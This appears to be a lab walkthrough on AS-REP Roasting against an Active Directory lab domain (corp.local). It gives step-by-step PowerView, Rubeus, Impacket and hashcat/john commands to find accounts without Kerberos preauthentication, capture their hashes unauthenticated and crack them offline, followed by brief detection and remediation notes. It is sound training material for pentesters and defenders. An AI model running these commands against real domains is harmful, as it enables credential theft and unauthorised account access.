# 03 — AS-REP Roasting

## Overview

When a user account has "Do not require Kerberos preauthentication" enabled, any unauthenticated attacker can request an AS-REP message for that account. The response contains data encrypted with the user's password hash, crackable offline.

## Lab Targets

| Account            | Domain         |
|--------------------|----------------|
| walid.saeed        | corp.local     |
| lina.script        | corp.local     |
| contractor.mutaeb  | corp.local     |
| majed.asrep        | dev.corp.local |

---

## Step 1: Find AS-REP Roastable Accounts

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, DoesNotRequirePreAuth

# Native AD
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName
```

## Step 2: Capture AS-REP Hash

```powershell
# Rubeus (authenticated)
.\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:C:\loot\asrep.txt

# Rubeus (unauthenticated — only needs usernames)
.\Rubeus.exe asreproast /user:walid.saeed /domain:corp.local /dc:192.168.56.10 /nowrap /format:hashcat
```

```bash
# Impacket (Linux — no authentication needed)
GetNPUsers.py corp.local/ -usersfile wordlists/lab-users.txt -dc-ip 192.168.56.10 -no-pass -outputfile asrep.txt

# With authentication (gets more results)
GetNPUsers.py corp.local/attacker.01:p@ssw0rd -request -dc-ip 192.168.56.10
```

## Step 3: Crack Hashes

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Detection

- Event ID 4768 — Kerberos Authentication Service ticket request with no pre-auth

## Remediation

- Disable "Do not require preauthentication" on all accounts (it is almost never needed)
- If required, enforce strong passwords (25+ chars) for those accounts
